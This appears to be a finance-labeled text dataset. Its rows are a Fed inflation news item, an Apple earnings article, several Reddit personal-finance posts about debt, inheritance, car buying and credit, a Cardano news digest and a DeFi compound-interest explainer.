The Fed also said inflation has “risen” but attributed the higher readings to “transitory factors”, meaning they expect any rise in inflationary pressures to be short-lived. Central bank officials warn that higher inflation reading could be coming as a result of measuring year-over-year changes from a highly unusual 2020. In other words, The Fed looks at changes in prices in a year-over-year format. Data for March and April of this year could therefore reflect large price “increases” because they are being compared against March and April in 2020 that saw massive price drops. 

Economic data published since the Fed’s last meeting in March 17 have largely supported their brighter outlook. Consumer spending surged 9.8% in March and initial jobless claims dropped to pandemic-era lows as more states continue reopening measures. In other news, according to a report by the Conference Board, consumer confidence has surged to a 14-month high in April as effective distribution of the vaccine and easing of social distancing guidelines in the US allows for the economy to gradually reopen. The Conference Board's monthly consumer confidence index jumped to a reading of 121.7 in April, or well above the 113.0 expected. Lynn Franco, senior director of economic indicators at the Conference Board, said in a statement, “Consumers’ assessment of current conditions improved significantly in April, suggesting the economic recovery strengthened further in early Q2. Consumers’ optimism about the short-term outlook held steady this month. Consumers were more upbeat about their income prospects, perhaps due to the improving job market and the recent round of stimulus checks.”

Apple Posts Record Revenue for Quarter

Demand for new 5G iPhones helps fuel a more than doubling of profit to $23.6 billion

Apple Inc. AAPL -0.60% reported record revenue Wednesday for the January-to-March quarter because of surging sales of premium iPhones and pandemic-induced buying of its other products.

&amp;#x200B;

Demand for new, higher-priced 5G iPhones helped fuel a more than doubling of profit to $23.6 billion off $89.6 billion in revenue. On a per share basis, the company said Wednesday, Apple earned $1.40, beating analyst expectations of 99 cents.

&amp;#x200B;

Apple didn’t provide any guidance in its release for this quarter. Chief Executive Tim Cook is expected to speak publicly with analysts this evening.

&amp;#x200B;

Investors are looking for signs that growth will continue, even as the tech sector struggles with a microchip shortage and other uncertainties stemming from the coronavirus pandemic. Some shareholders are evidently jittery. Shares rose 1.3% this year through Tuesday, while the S&amp;P 500 was up about 12%.

“There’s just so little room for error—it makes it really challenging,” said Dan Morgan, a senior portfolio manager who focuses on technology at Synovus Trust Co., which counts Apple among its largest holdings. “The market always looks six months ahead.”

&amp;#x200B;

Apple and other tech giants have benefited as students and workers stuck at home turned to their products in record numbers, pushing share prices to new heights. Apple’s stock almost doubled last year. Its current valuation, as a measure of its price-to-earnings ratio, is the highest since December 2007, according to FactSet, ratcheting up expectations for the company’s results.

Google-parent Alphabet Inc. beat sales records in the latest quarter thanks to an increase in digital-ad spending, and Microsoft Corp. saw its quarterly sales increase 19%.

&amp;#x200B;

Even as the world’s biggest tech companies continue to post record results, they remain in the crosshairs of regulators and investigators who are scrutinizing how they wield market power. Apple’s strength in the market is being questioned by smaller tech companies.

&amp;#x200B;

Apple this week rolled out software changes to iPhones and iPads to make it harder for apps to track users across the internet, a measure touted by Mr. Cook as a consumer safeguard. Facebook Inc. and others have questioned Apple’s motives in the matter.

Apple is on the eve of going to trial in federal court to defend itself against claims by the maker of the popular videogame “Fortnite” that the iPhone company is engaged in anticompetitive behavior in its app store. Apple has denied wrongdoing. Observers are also watching for regulators in the European Union to reveal results soon of their investigations into claims of Apple’s monopoly behavior. Apple has said the complaints are baseless and defended its role in promoting businesses on its App Store.

&amp;#x200B;

Apple stopped providing detailed guidance about coming quarters last year, as Covid-19 upended daily life around the world and initially sent markets falling amid fears of a global recession. Still, analysts and investors will be looking for any signs of how Mr. Cook is feeling about the months ahead.

Combined with the previous quarter’s results, the Cupertino, Calif.-based company is on pace, according to analysts’ estimates, to finish with an annual profit topping last year’s record tally by more than 20%.

&amp;#x200B;

Much of the growth last year was fueled in unexpected places. Apple saw record demand for Mac computers and an 11% rise in iPad tablet sales. That growth continued in the March period. On Wednesday, Apple said Mac sales rose 70% to $9.1 billion and iPads increased 79% to $7.8 billion. That beat analyst expectations for increases of 27% and 29%, respectively.

&amp;#x200B;

The real engine of 2021 is the latest iPhone: Overall iPhone revenue rose 65% to $47.9 billion. Analysts had expected a 42% rise.

&amp;#x200B;

Higher-end versions of the iPhone 12 appear to be boosting that figure. The average retail price in the U.S. during the past three months rose $52 to $847 from a year earlier, according to data from Consumer Intelligence Research Partners LLC, which surveys buyers.

&amp;#x200B;

The most expensive version, the Pro Max with a 6.7 inch display that starts at $1,099, saw its share grow to 20% of sales from 13% a year earlier, the survey found.

&amp;#x200B;

The addition of faster 5G cellular connections to this year’s phone was expected to help Apple in China, where competitors had beaten Mr. Cook to market with more advanced phones. Greater China sales nearly doubled to $17.7 billion.",finance

They found each other during that time and were able pull each other out of that situation. They got terrible jobs, got an apartment together to pool resources before they were even together, life happened and I came along along, they bought a house by the time I was 15 and life was pretty much perfect. I literally never not had something I needed, and if I asked for something, I would either get it if it was a reasonable request or told to grow up faster, get a job and buy it myself.

I was never really included in discussions about money and always assumed that we were not middle class because I knew the backstory of where my parents came from and how much were they were both putting in to support the family. But then last year, both of them died unexpectedly. Not going to get into that because feelings still raw. I was 17 so I lived with my aunt for a year and I just turned 18.

A lawyer for my parents' estate contacted my aunt last week because there were funds available that had not been ""freed"", whatever that means. We assumed it was a few thousand dollars from the sale of our house but it was a small house in an okay-ish part of town and we only lived there a few years so there wouldn't have been a lot of money into it.

So yeah, it wasn't about the house. We met with the lawyer and he handed me a hand-written letter from each of my parents. They had been written when I was around 14. It was just really amazing to hear from my parents like that and I just cried for hours.

It turns out that before I was born, my dad was supporting my mom for years so she could go to college and get a degree. When she was done, she got a good job with benefits and then my dad went to college to get and a degree while my mom supported him. So by the time I came around, they both had really good jobs and zero debt. I had no idea this even happened so now I have mad respect for them.

The lawyer explained to me and my aunt that the funds were just now made available because I turned 18. My parents bought a small house on purpose and used all their money to max out retirement accounts for almost 30 years. I don't know how it all works but they said in the letter that they never intended to retire and they meant for me to have all of that money from the start so I never had to live on the street or sell my body like my mom had to do when she was younger.

My parents literally bulletproofed my financial future from the grave. I've never even had a job and my aunt made it clear that I will never need to. 

If you got this far, thank you for sticking with it. Here's what I need to know. First, how do I make this money last? The last thing I want to do is waste what my parents spent a lifetime building for me. Second, how do I find someone who can help me with money and won't scam me? I googled around and lawyer gave me some referrals but I don't know who to trust. And finally, I know that I don't really need to work but I want to do for my future kids what my parents did for me. I don't have a specific field that I'm interested in, I'm a B student on a good day. I do want to go to college, especially now that I can afford it. I want a job with benefits and possibly working from home so what industry should I be going for and what degree should I get?

I know a lot of these questions are vague-ish or can go in a lot of different directions so I will answer any questions that help to narrow things now. 

I'm currently in Maine because that's where my aunt lives, originally from Vermont. I'd like to stay in Maine with my aunt for now because she's the only family I have left.

Thank you to whoever reads this and helps me.",finance

personalfinance,"In 2018, I was living above my means and $40k in debt. Now, I'm in $60k of debt and living even further beyond my means. Your mental health = wealth, quite literally in my case.","*Throwaway due to personal information being shared.* 

I am preparing to file for bankruptcy within the next months.

For some background, I'm struggling with a bunch of mental health issues: depression, anxiety, and ADHD. I have panic attacks, struggle with with overeating, struggle with impulsive and compulsive shopping, I pick at my skin and pluck my hair \*way\* too much (dermatillomania and trichotillomania). I also have a few other minor medical conditions: a pituitary tumor, hemorrhoids, allergies (seasonal and those that cause anaphylaxis). 

After a week long psychiatric hospital stay in 2018, I was able to stabilize my mood and hold down a full time job. **I went from $11/hr to $15/hr + commission**. I split rent with two roommates. I cooked dinner *and* brought leftovers to work. I realized that I had no self control, so I quit my part time retail job. I ended up *saving* money because I wasn't tempted to buy clothes every shift. I was living off my hourly pay and using my commission to pay off debt. I was making actual progress. I was excited to pay off my debt and I had a goal to be debt free in the next five years. Life was good. 

**I goofed back in 2019 by abruptly stopping my Prozac.** Everything went to hell. I lost my ability to tolerate adult responsibilities. My shopping addiction came back. I was having panic attacks driving to work, at work, and even at home. I was sleepless at night and drowsy during the day. I could no longer handle working full time, so I used FMLA to drop down to 20/hours a week. I soon realized that I didn't have enough money to sustain myself, so I went back to working full time. By that point, I would show up late, leave early, and call out on a weekly basis. I ""quit"" my job about 3 different times in the span of 6 months, only to have my manager call me to come back. I was so stressed about money, so I attempted to work a part time job \*twice\* between July 2019 and January 2020. I didn't even make it a full month working both jobs. I'd call out from work and lay in my bed and cry. 

**I eventually quit my old job in March 2020 and lived off my credit cards until I found a job making $13/hr in May.** I quit that job when I found my current job, which pays me $20/hr.  

Now, here I am today. I’m struggling to find a reason to continue going to work. I work from home, yet I don’t care to show up to work on time or even stay at work for my full shift. I’m not fully engaged at work. I’m typing out this Reddit post instead of working, since my job either bores me to the point of online shopping or worries me to the point of panic attacks.  

I’m a debt collector at a major bank and I have no sustainable interest in my industry or current career path. I don’t want a promotion because I’m not interested in any new responsibilities. I am not interested in any lateral moves at my current company, or for anything I have experience in.

**I’ve run out of PTO at this point of the year,** so my paychecks are looking paltry. I’m only really working 10-20 hours a week. I missed 2 weeks of work this month, and I didn’t even realize it. I was just sleeping at home. Since I was a total b\*\*\*\* to my roommates, I ended up moving to my current apartment by myself.

I have about $500 to my name. I expect a paycheck of about $600 on Friday. **If I were working my normally scheduled hours, I would have to put one paycheck towards rent and the other paycheck towards debt.**

I also have no idea how much I am truly spending each month. I have 3 bank accounts and about 15 credit cards. I only know that is significantly ($1k-2K) more than make each month. Reviewing my bank statements gives me such overwhelming anxiety that I end up sleeping to ride it out. 

r/PersonalFinance would chastise me for the things I’m spending money on. *Instacart* (grocery shopping is overwhelming), *DoorDash* (cooking is overwhelming), *LinkedIn Premium* (maybe I’ll find a job I want?), *Apple Music* (I \*despise\* advertisements since I’m easily tempted to shop), *The New York Times + my local newspaper* (I prefer reading over watching the news, and all the good news is behind paywalls), *two storage units* (I have a \*lot\* of stuff but college memorabilia and cheap clothes composes the bulk of it), *Misfits Market* (I get around to cooking maybe half of the food I receive, and then actually eat maybe half of what I cook), *skincare* (to curb my picking and pulling)… Wait till you all hear that I want to add a YMCA membership and a clothing rental subscription to that as well. 

I have about $20k in credit cards. The lowest APR is 16% and the highest is 29%. I have a $15k personal loan at 11%. I have 20k worth of student loans for my B.A. in Psychology (I don’t remember the APR since the loans are in the emergency forbearance). I have about $6k in medical bills, yet I make too much to qualify for financial assistance. **My total debt payments are about $1200 a month.**

**My rent it $995 a month**, plus internet (allows me to WFH and attend virtual therapy) and other utilities. 

My parents are paying for my cell phone and my car insurance, so I don’t have to worry about those expenses.

For clarity's sake, I'm not going into details on my annual medical expenses, my cats, and my POS car.

At this point, this post isn’t even to ask for help. It’s to share my story in case someone else is in a situation like mines. **Don't be me. Take your medications and take care of your mental health.**

\_\_

&amp;#x200B;

**TL;DR: I was making good progress with paying off my debt until I decided to stop taking my antidepressant. Now I'm in a bigger hole than before and I don't see how I'm going to dig my way out. Don't forget about your mental health while attending to your financial health.**",finance
personalfinance,My in-laws are recommending we hire a financial planner to create an investment strategy that's successful.

personalfinance,"First time car buyer new graduate, moving soon - not sure where to start","I (21F) am about to graduate soon and start a new job in June. I need to move from Texas to California for this job, and also buy a car for commuting purposes. I have decent credit if you just consider the number (755) but that consists of three credit cards and federal student loans only. While I currently don't have a job, my future job offer is $110k a year. I'm trying to decide whether to buy a car before I move to California or after. 

If I buy now:

* Texas has a lower car sales tax (by 1%)
* My family is here and can help me find a good deal
* My parents can possibly cosign with me (although they don't have great credit, they do have car buying histories and 100% on time payments so I think it will help) 
* But I will have to drive all the way to California soon after buying it, so if there are issues then it will be a headache
* I'm also not that confident in my driving abilities yet (after not having driven for a while) and am nervous to drive alone for many days in a row so soon
* I think I have to pay registration fees for the car to the state? If I buy in Texas, will I have to pay the fees in California as well?

If I buy after moving:

* I will have started the job already so my income might get me better interest rates. I also get a signing bonus so I could technically just buy a \~$12k car in cash
* I don't know anything about cars so I will probably not find the best deal on my own though, and as the price gets lower, I get more worried that there is something wrong with the car
* My parents won't be present as cosigners anymore if I'm in California, can they do it from another state? 
* The whole process of finding a car is slightly overwhelming for me so I might even give into anxiety and buy a new car because it's easier
* I won't have to do a long drive so at least I won't have to worry about death (haha anxiety) (but really)

Also, how does insurance work? Can my parents add me to their insurance in a different state? Can they cosign with me if they are in a different state? Is there a benefit of getting my own separate insurance?

Basically, I am asking if this process is simpler than what my anxious brain is telling me. I don't want to be dumb and make an expensive purchase because I'm worried about having to do complicated things that sound intimidating. Adulthood is kind of scary hehe please help",finance
personalfinance,Pause 401k to save for house?,"I am 25 y/o female with a stable job making $105,600 a year

My partner and I plan on buying a duplex or multi-family within the next year with the goal of house hacking. Target home price would be $550,000. 

My employer retirement plan is split up into 2 parts. 

Part A is required -

Employee contributes 7.5% and I contribute 2%

Part B is optional -

I can contribute up to 10% of which employer will match up to 1/4 of 

&amp;#x200B;

I currently am contributing enough to get the whole match, 12% on my part and 10% from employer. 

If I pause my Part B contribution for a year to save up for a downpayment on a house that would reduce my retirement contribution by 12.5% (10% me and 2.5% employer). 

My current take-home is $5,873.23

Expenses/Budget:

* Rent: $1,046.50
* utilities: $167.50 (approximate)
* cell: $43
* student loans: $260 (I've only been paying $40 since the govt issued forbearance on federal student loans )
* parents: $780 (Paying back my parents for college)
* apple one subscription: $6
* groceries: $300 
* eating out: $200 

Debt:

* Perkins loan: $2,319.51 (5% interest rate currently paying $40/month)
* federal loans: $15,116.08 (currently paying $0 a month but normally $220)
* parents: $53,122 (currently paying $780/month)

This leaves me with $3,070.23. There's a few things that I haven't budgeted for. We'll be getting a dog soon and I'm not sure what the cost on food, grooming, and trips to the vet will be. I don't have a car but my partner does and I chip in half for the gas. We don't drive much and get gas at most 3 times a month. 

I currently have an emergency fund of $15,000. 

My goal is to save at least $20,000 within a year which is definitely doable. If I stop my Part B contribution ($10,560.16 for the year) that would increase my take-home by $7,920.12 assuming a 25% tax rate for simplicity sake. I would also lose out on $2,640 of employer match.

My partner plans to save at least $20,000 as well. We definitely wont have 20% down and will probably be getting a 3.5% down mortgage with PMI.",finance

Since our jobs are in the suburbs there's not many options for renting - a 1 bedroom or studio typically goes for $2,500 - $2,800 per month unless you are renting out someone's basement or attic (even then usually $1,800 - $2,200). But there are many houses in the $450k-$500k range that would result in a similar monthly mortgage payment. I've also considered moving into an apartment temporarily but I don't want to diminish my future ability to own a home by losing so much money on rent.

I have $80k in savings and another $80k in a brokerage so I'm thinking I should be able to afford a 20% down payment with enough cash left over for closing costs, renovations, emergency fund, etc. I have another $65k in my 401k. Neither of us have any outstanding debts.

As far my career I was recently promoted with a 20% salary bump and we are both doing well where we are. I have thought about moving to lower COL areas but I'm not sure it's worth risking our careers which are currently pretty stable. I am currently working remote but my office does intend on recalling workers back this summer.

We also don't plan on having children. Of course we could continue living at home and save up even more but I am anticipating that housing prices will continue to rise for the foreseeable future even as interest rates go up. The other issue is that living with my parents has become increasingly stressful due to boundary issues and I feel like it is negatively impacting my mental health. 

So I guess my question is if I have a solid basis for owning or if I'm not quite there yet? Any feedback is appreciated.

2. In today’s video we also cover questions about the relationship between Atala Prism and who will actually benefit from the Cardano Projects with African governments.

Previously Covered but still interesting:

He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book.

10. ...AND STILL....CARDANO=THE KING OF GITHUB COMMITS!  [https://twitter.com/wiSource/status/1379142670686294017](https://twitter.com/wiSource/status/1379142670686294017)
11. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

12. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development.  [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
13. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
14. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia.  This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
15. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
16. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
17. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
18. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
19. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.  
20. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
21. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this. 
22. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
23. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
24. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting. 
25. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
26. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

32. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
33. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.   [https://github.com/input-output-hk/plutus-pioneer-program](https://github.com/input-output-hk/plutus-pioneer-program)
34. There is now a website that will mint Cardano NFTs for you.  Thanks to Cardano subreddit user Padierfind. [https://www.nft-maker.io/](https://www.nft-maker.io/)
35. Yesterday was “Get ADA Day” with the end of Epoch 258.  I hope everyone did well in their staking. 
36. Here’s a great way to visualize token minting and other on-chain activities thanks to Smaug Stake Pool. [https://pool.pm/](https://pool.pm/)
37. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
38. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.  [https://twitter.com/jp\_tattooist/status/1381236949567086592 ](https://twitter.com/jp_tattooist/status/1381236949567086592)[https://twitter.com/jp\_tattooist/status/1381351429554724875](https://twitter.com/jp_tattooist/status/1381351429554724875)
39. Ethiopian Prime Minister Abiy Ahmed outlines how he will liberalize the telecom industry in his country and lays out his four pillars of “Digital Ethiopia 2025”: digital ID, interoperable payment platforms, e-government applications, and e-commerce.

44. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

45. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.  Here’s the LunarCrush interview. All queued up to the exact spot for the Africa discussion--[https://youtu.be/GWpqNPdOf9E?t=3804](https://youtu.be/GWpqNPdOf9E?t=3804)
46. Occam has announced that the Occam Razer IDO (Initial Dex Offering) is completed and that it sold out in 30 seconds.  There was no lack of criticism for the way in which the IDO was carried out.

62. We just experienced a big flash crash in price. A prime suspect is the drop in hash rate in BTC due to the Blackouts in China. Is the crypto space ready to accept that Nakamoto style consensus on PoW leads directly to unacceptable levels of centralization? This has been the dirty secret of  PoW crypto and its decentralization loving enthusiasts for years. [https://bitcoinmagazine.com/business/bitcoin-mining-hash-rate-drops-as-blackouts-instituted-in-china](https://bitcoinmagazine.com/business/bitcoin-mining-hash-rate-drops-as-blackouts-instituted-in-china)
63. Charles posted a somewhat cryptic tweet that read “Omega + Hydra + Mithral = GG”.  The Ourobors Omega, Ouroboros Hydra,  &amp; Mithral parts we’ve covered before.  Omega is a capstone rollup of Praos (2017), Genesis (2018), + Redux, +Chronos, +Ledger Combiners, +some other things from the rest of the space. Hydra is layer two. Mithral is trustless light wallets via zk-SNARKs.  Guesses as to the “GG” ranged from “Good Game” (as in game over for competitors) to “Goguen”.  See today’s video at the link above for more discussion on this.  [https://twitter.com/IOHK\_Charles/status/1383792375860924424](https://twitter.com/IOHK_Charles/status/1383792375860924424)

70. Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; 6) and iOS and Android integration is coming along nicely and well on the way.   [https://www.youtube.com/watch?v=EorsiQfEV7o](https://www.youtube.com/watch?v=EorsiQfEV7o)

72. It looks like Yellow Card and Payway are listed on the Africa Special website.  Given their business models, it is easy to guess that they could be valuable in the Pan Africa Strategy.  [https://payway.et/](https://payway.et/) [https://yellowcard.io/](https://yellowcard.io/) 
73. Partnership with World Mobile in Tanzania. Credit to Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/u/ricklepicklemydickle/) for originally finding this one.

74. Recap from yesterday:  the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3)  [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.  
75. Once again we are the champions! Not just of github commits this time, but also of total staked asset value. [https://www.stakingrewards.com/](https://www.stakingrewards.com/)
76. Rick interviewed CardStarter which is a Cardano accelerator. The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) they plan to fund projects prior to token launch through token vouchers, and 3) it sounds like they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.  Watch the interview and form your own opinion.  [https://youtu.be/nIklWKtr\_aY](https://youtu.be/nIklWKtr_aY) [https://cardstarter.io/](https://cardstarter.io/)
77. The Cardano Foundation has adjusted its delegation strategy. This brings up a question:  where does the balance lie between allowing Adam Smith’s hidden hand to work its free market magic and trying to help small pools?

79. We’ve had really good reporting from the community on World Mobile developments with Cardano. I just want to take a second to thank you guys. Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/user/ricklepicklemydickle/) first alerted us to the World Mobile developments and then youtube user [Whiskey 1234](https://www.youtube.com/channel/UCyBeEq-paultoA127TYcDjQ) (love both usernames btw) let us know that he attended a conference where he encountered World Mobile and “asked them if they knew about Cardano blockchain and the reply was they were announcing partners at the end of this month.” Thank you very much for this intel guys.This is what Army of Spies is all about. Many thanks for your contributions, gentlemen.

personalfinance,Did I royally mess up my credit or am I able to recover?,"I was fed up with a low credit line so I closed it. I tried to describe the details in depth, please let me know if additional clarification is required. 

* Student
* Annual income $: 40,000 avg.
* Debts: $12,000 remaining on car loan. 
* Purpose: Building credit to purchase a home in 2-3 yrs. Overall credit building.

**Card data and limits before:**

* 100% on-time payments. **750** Transunion, **746** Equifax, **758** Fico. 
* Capital One QuickSilver -- First card, $500 limit opened 10/2018. (Note: $40 annual fee)
* Capital One SavorOne -- Second card, $1,000 limit opened 12/2019
* Discover It -- Third card, $2,000 limit opened 10/2020

I tried to get my limit raised on my first card after the first year. They said my usage was too low, but I always keep my utilization at or under 10% for my cards. This is carefully budgeted with bills, groceries, or gas. After another year I tried again and was denied, so I made the decision to close the card. I was not making any returns on the rewards offered (I think it made it to $8.34 after a full year). 

**Card data and limits after:**

* 100% on-time payments. **745** Transunion, **742** Equifax, **750** Fico. 
* Capital One QuickSilver -- Closed.
* Capital One SavorOne -- Second card, $1,000 limit opened 12/2019
* Discover It -- Third card, $2,000 limit opened 10/2020
* Costco Citi Visa -- Fourth card, $1,200 limit opened 4/2021 (No fee with membership. &amp; Not activated yet).
* NFCU AMEX -- Last card (ever), $25,000 limit opened 4/2021

So, I closed my oldest card and I'm not sure if I made the right decision. I'm happy with the limits and cards I have currently. None of my current cards have annual fees. I don't plan on opening any other cards anytime soon as I'm happy with the reward programs and I really like Costco's overall benefits. 

* (1.) I'm concerned about closing my oldest account and if this will negatively affect me in the future. Was I supposed to keep my oldest account open? 

* (2.) I'm also worried about the other Capital One card. If they don't increase the limit after this year, I'm not sure if I want to keep it open but at this point its my oldest card. 

Thank you",finance

CryptoCurrency,DeFi Explained: Yield farming,"Yield farming is becoming increasingly popular among crypto investors. Of course, this is not illogical: DeFi platforms offer much higher interest rates compared to traditional banks. To understand yield farming, you first need to know what the interest-on-interest effect (or compound interest) is.

# Compound interest

When you are saving money at a bank, you receive an interest payment for this: the so-called savings interest. Depending on the chosen type of savings, the interest is paid into the savings account or another (checking) account. If the interest payment is added to the savings account, you also accrue interest over that interest amount. This is called the interest-on-interest effect (compound interest).

# Factors for success

The effect of compound interest depends on three factors:

* Time. How long do you leave the money? You can see in the graph that the effect increases as more time passes.
* The percentage of interest or return that you make. Nowadays you hardly get any interest on a savings account, this affects your return. As a result, the effect of interest-on-interest is limited. The higher your return, the greater the impact of what Einstein called the eighth wonder of the world.
* The starting amount. The larger your starting amount, the greater the effect. After all, that starting amount grows every year.

One of the richest investors on the planet, Warren Buffet, has been taking advantage of compound interest for years. He bought his first stock when he was 11 years old. He made above-average returns and stayed off his money for decades. You can imagine how big the effect of interest-on-interest is.

## Example:

Let’s say you want to deposit $20,000. There are 2 banks who both offer interest. One pays 4% per year and the other one pays 1% per quarter. Let’s put $10,000 in both banks and see what happens:

* Bank A: interest payment: 4% (per year)
* Bank B: interest payment: 1% (per quarter)

&amp;#x200B;

* Bank A: 4% of $10,000 = $400 in interest per year

&amp;#x200B;

* Bank B: 1% of $10,000 = $100 in the first quarter
* 1% of $10,100 = $101 in the second quarter
* 1% of $10,201 = $102.10 in the third quarter
* 1% of $10,303.10 = $103.03 in the fourth quarter
* Bank B: total amount of interest on an annual basis: $406.13.

The effective return of bank B is higher than bank A: 4.06 percent on an annual basis.

# Example of yield farming

Because yield farming is often combined with liquidity pools, I suggest that you read my post about liquidity pools first. You can do so by [clicking this link](https://www.reddit.com/r/CryptoCurrency/comments/mfk2oi/defi_explained_liquidity_pools/).

